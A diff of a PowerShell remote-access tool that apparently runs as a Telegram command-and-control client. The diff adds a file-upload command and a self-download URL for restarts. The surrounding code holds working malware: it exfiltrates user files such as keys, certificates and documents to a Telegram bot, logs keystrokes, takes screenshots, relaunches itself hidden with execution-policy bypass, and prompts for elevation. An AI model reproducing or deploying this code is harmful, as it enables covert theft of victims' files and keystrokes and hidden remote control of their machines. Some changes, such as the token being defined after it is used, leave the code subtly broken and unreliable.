@@ -1,17 +1,12 @@
-#------------------------------------------------ SCRIPT SETUP ---------------------------------------------------
-# Define User Variables
-$Token = "$tg"  # Your Telegram Token
-
-# Define Connection Variables
 $PassPhrase = "$env:COMPUTERNAME"
+$global:errormsg = 0
+$parent = "https://raw.githubusercontent.com/beigeworm/Powershell-Tools-and-Toys/main/Command-and-Control/Telegram-C2-Client.ps1" # parent script URL (for restarts and persistance)
 $URL='https://api.telegram.org/bot{0}' -f $Token
 $apiUrl = "https://api.telegram.org/bot$Token/sendMessage"
 $AcceptedSession=""
 $LastUnAuthenticatedMessage=""
 $lastexecMessageID=""
-$global:errormsg = 0 # 1 = return error messages (off by default)
-
-# Emoji characters
+$Token = "$tg"
 $tick = [char]::ConvertFromUtf32(0x2705)
 $comp = [char]::ConvertFromUtf32(0x1F4BB)
 $closed = [char]::ConvertFromUtf32(0x274C)
@@ -19,27 +14,17 @@ $waiting = [char]::ConvertFromUtf32(0x1F55C)
 $glass = [char]::ConvertFromUtf32(0x1F50D)
 $cmde = [char]::ConvertFromUtf32(0x1F517)
 $pause = [char]::ConvertFromUtf32(0x23F8)
-
-# Startup Delay
-if(Test-Path "$env:APPDATA\Microsoft\Windows\PowerShell\copy.ps1"){Sleep 15}
-Sleep 5
-# remove pause files
 if(Test-Path "$env:APPDATA\Microsoft\Windows\temp.ps1"){rm -path "$env:APPDATA\Microsoft\Windows\temp.ps1" -Force}
 if(Test-Path "$env:APPDATA\Microsoft\Windows\temp.vbs"){rm -path "$env:APPDATA\Microsoft\Windows\temp.vbs" -Force}
-# Get Chat ID from the bot
-$updates = Invoke-RestMethod -Uri ($url + "/getUpdates")
+Sleep 10
+$updates = irm -Uri ($url + "/getUpdates")
 if ($updates.ok -eq $true) {$latestUpdate = $updates.result[-1]
 if ($latestUpdate.message -ne $null){$chatID = $latestUpdate.message.chat.id;Write-Host "Chat ID: $chatID"}}
-$MessageToSend = New-Object psobject 
-$MessageToSend | Add-Member -MemberType NoteProperty -Name 'chat_id' -Value $ChatID
-# Collect script contents
-$scriptDirectory = Get-Content -path $MyInvocation.MyCommand.Name -Raw
-#----------------------------------------------- ON START ------------------------------------------------------
-# Message waiting for passphrase
+$mts = New-Object psobject 
+$mts | Add-Member -MemberType NoteProperty -Name 'chat_id' -Value $ChatID
 $contents = "$comp $env:COMPUTERNAME $waiting Waiting to Connect.."
 $params = @{chat_id = $ChatID ;text = $contents}
-Invoke-RestMethod -Uri $apiUrl -Method POST -Body $params
-#----------------------------------------------- ACTION FUNCTIONS -------------------------------------------------
+irm -Uri $apiUrl -Method POST -Body $params
 
 Function Options{
 $contents = "==============================================
@@ -56,6 +41,7 @@ FolderTree    : Gets Dir tree and sends it zipped
 Screenshot   : Sends a screenshot of the desktop
 Keycapture    : Capture Keystrokes and send
 Exfiltrate   : Sends files (see below for info)
+Upload      : Uploads a specific file (use -path)
 Systeminfo   : Send System info as text file
 Softwareinfo   : Send Software info as text file
 Historyinfo   : Send History info as text file
@@ -67,7 +53,7 @@ Kill    : Killswitch for 'KeyCapture' and 'Exfiltrate'
 
 =============================================="
 $params = @{chat_id = $ChatID ;text = $contents}
-Invoke-RestMethod -Uri $apiUrl -Method POST -Body $params | Out-Null
+irm -Uri $apiUrl -Method POST -Body $params | Out-Null
 }
 
 Function ExtraInfo{
@@ -76,7 +62,6 @@ $contents = "==============================================
 ==============================================
 
 =========  Exfiltrate Command Examples ==========
-
 ( PS`> Exfiltrate -Path Documents -Filetype png )
 ( PS`> Exfiltrate -Filetype log )
 ( PS`> Exfiltrate )
@@ -91,17 +76,40 @@ log, db, txt, doc, pdf, jpg, jpeg, png,
 wdoc, xdoc, cer, key, xls, xlsx,
 cfg, conf, docx, rft.
 
+==========  Upload Command Examples ===========
+(PS`> Upload -Path C:/Path/To/File.txt)
+Use 'FolderTree' command to show all files
+
 =============================================="
 $params = @{chat_id = $ChatID ;text = $contents}
-Invoke-RestMethod -Uri $apiUrl -Method POST -Body $params | Out-Null
+irm -Uri $apiUrl -Method POST -Body $params | Out-Null
 }
 
 Function Close{
 $contents = "$comp $env:COMPUTERNAME $closed Connection Closed"
 $params = @{chat_id = $ChatID ;text = $contents}
-Invoke-RestMethod -Uri $apiUrl -Method POST -Body $params
+irm -Uri $apiUrl -Method POST -Body $params
 rm -Path "$env:temp/tgc2.txt" -Force
 exit
+}
+
+Function Upload{
+param ([string[]]$Path)
+if (Test-Path -Path $path){
+    $extension = [System.IO.Path]::GetExtension($path)
+    if ($extension -eq ".exe" -or $extension -eq ".msi") {
+        $tempZipFilePath = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), [System.IO.Path]::GetFileName($path))
+        Add-Type -AssemblyName System.IO.Compression.FileSystem
+        [System.IO.Compression.ZipFile]::CreateFromDirectory($path, $tempZipFilePath)
+        curl.exe -F chat_id="$ChatID" -F document=@"$tempZipFilePath" "https://api.telegram.org/bot$Token/sendDocument" | Out-Null
+        Write-Output "File Upload Complete: $path"
+        Rm -Path $tempZipFilePath -Recurse -Force
+    }else{
+        curl.exe -F chat_id="$ChatID" -F document=@"$Path" "https://api.telegram.org/bot$Token/sendDocument" | Out-Null
+        Write-Output "File Upload Complete: $path"
+        Rm -Path $tempZipFilePath -Recurse -Force
+    }
+}else{Write-Host "File Not Found: $path"}
 }
 
 Function Exfiltrate {
@@ -112,7 +120,7 @@ $index = 1
 $zipFilePath ="$env:temp/Loot$index.zip"
 $contents = "$env:COMPUTERNAME $tick Exfiltration Started.. (Stop with Killswitch)"
 $params = @{chat_id = $ChatID ;text = $contents}
-Invoke-RestMethod -Uri $apiUrl -Method POST -Body $params  | Out-Null
+irm -Uri $apiUrl -Method POST -Body $params  | Out-Null
 If($Path -ne $null){$foldersToSearch = "$env:USERPROFILE\"+$Path}
 else{$foldersToSearch = @("$env:USERPROFILE\Documents","$env:USERPROFILE\Desktop","$env:USERPROFILE\Downloads","$env:USERPROFILE\OneDrive","$env:USERPROFILE\Pictures","$env:USERPROFILE\Videos")}
 If($FileType -ne $null){$fileExtensions = "*."+$FileType}
@@ -138,7 +146,7 @@ foreach ($folder in $foldersToSearch) {
                     if ($messages.message.text -contains "kill") {
                     $contents = "$comp $env:COMPUTERNAME $closed Exfiltration Killed"
                     $params = @{chat_id = $ChatID ;text = $contents}
-                    Invoke-RestMethod -Uri $apiUrl -Method POST -Body $params
+                    irm -Uri $apiUrl -Method POST -Body $params
                     break
                     }
                 }
@@ -153,7 +161,7 @@ curl.exe -F chat_id="$ChatID" -F document=@"$zipFilePath" "https://api.telegram.
 rm -Path $zipFilePath -Force
 $contents = "$env:COMPUTERNAME $tick Exfiltration Complete!"
 $params = @{chat_id = $ChatID ;text = $contents}
-Invoke-RestMethod -Uri $apiUrl -Method POST -Body $params  | Out-Null
+irm -Uri $apiUrl -Method POST -Body $params  | Out-Null
 }
 
 
@@ -174,7 +182,7 @@ Remove-Item -Path $filePath
 Function KeyCapture {
 $contents = "$env:COMPUTERNAME $tick KeyCapture Started.. (Stop with Killswitch)"
 $params = @{chat_id = $ChatID ;text = $contents}
-Invoke-RestMethod -Uri $apiUrl -Method POST -Body $params
+irm -Uri $apiUrl -Method POST -Body $params
 $API = '[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] public static extern short GetAsyncKeyState(int virtualKeyCode); [DllImport("user32.dll", CharSet=CharSet.Auto)]public static extern int GetKeyboardState(byte[] keystate);[DllImport("user32.dll", CharSet=CharSet.Auto)]public static extern int MapVirtualKey(uint uCode, int uMapType);[DllImport("user32.dll", CharSet=CharSet.Auto)]public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);'
 $API = Add-Type -MemberDefinition $API -Name 'Win32' -Namespace API -PassThru
 $LastKeypressTime = [System.Diagnostics.Stopwatch]::StartNew()
@@ -208,7 +216,7 @@ While ($true){
         if ($messages.message.text -contains "kill") {
         $contents = "$comp $env:COMPUTERNAME $closed KeyCapture Killed"
         $params = @{chat_id = $ChatID ;text = $contents}
-        Invoke-RestMethod -Uri $apiUrl -Method POST -Body $params | Out-Null
+        irm -Uri $apiUrl -Method POST -Body $params | Out-Null
         break
         }
     }
@@ -218,7 +226,7 @@ While ($true){
             $timestamp = Get-Date -Format "dd-MM-yyyy HH:mm:ss"
             $contents = "$glass Keys Captured : "+$escmsgsys
             $params = @{chat_id = $ChatID ;text = $contents}
-            Invoke-RestMethod -Uri $apiUrl -Method POST -Body $params | Out-Null
+            irm -Uri $apiUrl -Method POST -Body $params | Out-Null
             $keyPressed = $false
             $nosave = ""
         }
@@ -344,11 +352,11 @@ $paramers = @{
     text = $messagehead
     reply_markup = $inlineKeyboardJson
 }
-Invoke-RestMethod -Uri $apiUrl -Method POST -ContentType "application/json" -Body ($paramers | ConvertTo-Json -Depth 10)
+irm -Uri $apiUrl -Method POST -ContentType "application/json" -Body ($paramers | ConvertTo-Json -Depth 10)
 $killint = 0
 $offset = 0
 while ($killint -eq 0) {
-    $updates = Invoke-RestMethod -Uri "https://api.telegram.org/bot$Token/getUpdates?offset=$offset" -Method Get
+    $updates = irm -Uri "https://api.telegram.org/bot$Token/getUpdates?offset=$offset" -Method Get
     foreach ($update in $updates.result) {
         $offset = $update.update_id + 1
         Sleep 1
@@ -364,7 +372,7 @@ while ($killint -eq 0) {
 }
 $contents = "$comp $env:COMPUTERNAME $tick Session Started"
 $params = @{chat_id = $ChatID ;text = $contents}
-Invoke-RestMethod -Uri $apiUrl -Method POST -Body $params
+irm -Uri $apiUrl -Method POST -Body $params
 }
 
 Function FolderTree{
@@ -388,7 +396,7 @@ sleep 1
 if ($newScriptPath.Length -lt 100){
     "`$tg = `"$tg`"" | Out-File -FilePath $newScriptPath -Force
     "`$gh = `"$gh`"" | Out-File -FilePath $newScriptPath -Append
-    i`wr -Uri "https://raw.githubusercontent.com/beigeworm/assets/main/Scripts/TG-C2.ps1" -OutFile "$env:temp/temp.ps1"
+    i`wr -Uri "$parent" -OutFile "$env:temp/temp.ps1"
     sleep 1
     Get-Content -Path "$env:temp/temp.ps1" | Out-File $newScriptPath -Append
     }
@@ -411,15 +419,14 @@ Write-Output "Uninstalled."
 Function PauseSession{
 $contents = "$env:COMPUTERNAME $pause Pausing Session.."
 $params = @{chat_id = $ChatID ;text = $contents}
-Invoke-RestMethod -Uri $apiUrl -Method POST -Body $params
+irm -Uri $apiUrl -Method POST -Body $params
 $newScriptPath = "$env:APPDATA\Microsoft\Windows\temp.ps1"
-$scriptContent | Out-File -FilePath $newScriptPath -force
-if ($newScriptPath.Length -lt 100){
-    "`$tg = `"$tg`"" | Out-File -FilePath $newScriptPath -Force
-    "`$gh = `"$gh`"" | Out-File -FilePath $newScriptPath -Append
-    i`wr -Uri "https://raw.githubusercontent.com/beigeworm/assets/main/Scripts/TG-C2.ps1" -OutFile "$env:temp/temp.ps1"
-    Get-Content -Path "$env:temp/temp.ps1" | Out-File $newScriptPath -Append
-    }
+
+"`$tg = `"$tg`"" | Out-File -FilePath $newScriptPath -Force
+"`$gh = `"$gh`"" | Out-File -FilePath $newScriptPath -Append
+i`wr -Uri "$parent" -OutFile "$env:temp/temp.ps1"
+Get-Content -Path "$env:temp/temp.ps1" | Out-File $newScriptPath -Append
+
 $tobat = @'
 Set objShell = CreateObject("WScript.Shell")
 objShell.Run "powershell.exe -NonI -NoP -Exec Bypass -W Hidden -File ""%APPDATA%\Microsoft\Windows\temp.ps1""", 0, True
@@ -436,15 +443,14 @@ Function IsAdmin{
 If (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]'Administrator')) {
     $contents = "$closed Current Session is NOT Admin $closed"
     $params = @{chat_id = $ChatID ;text = $contents}
-    Invoke-RestMethod -Uri $apiUrl -Method POST -Body $params | Out-Null
+    irm -Uri $apiUrl -Method POST -Body $params | Out-Null
     }
     else{
     $contents = "$tick Current Session IS Admin $tick"
     $params = @{chat_id = $ChatID ;text = $contents}
-    Invoke-RestMethod -Uri $apiUrl -Method POST -Body $params | Out-Null
+    irm -Uri $apiUrl -Method POST -Body $params | Out-Null
     }
 }
-
 
 Function AttemptElevate{
 Write-Output "Prompt Sent to User.."
@@ -454,7 +460,7 @@ if(!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::
     if ($newScriptPath.Length -lt 100){
         "`$tg = `"$tg`"" | Out-File -FilePath $newScriptPath -Force
         "`$gh = `"$gh`"" | Out-File -FilePath $newScriptPath -Append
-        i`wr -Uri "https://raw.githubusercontent.com/beigeworm/assets/main/Scripts/TG-C2.ps1" -OutFile "$env:temp/temp.ps1"
+        i`wr -Uri "$parent" -OutFile "$env:temp/temp.ps1"
         Get-Content -Path "$env:temp/temp.ps1" | Out-File $newScriptPath -Append
         }
     Start-Process PowerShell.exe -ArgumentList ("-NoP -Ep Bypass -W Hidden -File `"$env:APPDATA\Microsoft\Windows\temp.ps1`"") -Verb RunAs
@@ -467,14 +473,14 @@ If($global:errormsg -eq 0){
     $global:errormsg = 1
     $contents = "$tick Error Messaging ON $tick"
     $params = @{chat_id = $ChatID ;text = $contents}
-    Invoke-RestMethod -Uri $apiUrl -Method POST -Body $params | Out-Null
+    irm -Uri $apiUrl -Method POST -Body $params | Out-Null
     return
     }
 If($global:errormsg -eq 1){
     $global:errormsg = 0
     $contents = "$closed Error Messaging OFF $closed"
     $params = @{chat_id = $ChatID ;text = $contents}
-    Invoke-RestMethod -Uri $apiUrl -Method POST -Body $params | Out-Null
+    irm -Uri $apiUrl -Method POST -Body $params | Out-Null
     return
     }
 }
@@ -487,7 +493,7 @@ param($CheckMessage)
         $script:AcceptedSession="Authenticated"
         $contents = "$comp $env:COMPUTERNAME $tick Session Starting..."
         $params = @{chat_id = $ChatID ;text = $contents}
-        Invoke-RestMethod -Uri $apiUrl -Method POST -Body $params
+        irm -Uri $apiUrl -Method POST -Body $params
         ShowButtons
         return $messages.message.chat.id
     }Else{return 0}
@@ -509,8 +515,8 @@ return $FixedResult
 Function stgmsg{
 param($Messagetext,$ChatID)
 $FixedText=StrmFX -Stream $Messagetext
-$MessageToSend | Add-Member -MemberType NoteProperty -Name 'text' -Value $FixedText.line -Force
-$JsonData=($MessageToSend | ConvertTo-Json)
+$mts | Add-Member -MemberType NoteProperty -Name 'text' -Value $FixedText.line -Force
+$JsonData=($mts | ConvertTo-Json)
 irm -Method Post -Uri ($URL +'/sendMessage') -Body $JsonData -ContentType "application/json"
 $catcher = $FixedText
 }
@@ -548,3 +554,4 @@ $messages=rtgmsg
         }
     }
 }
+
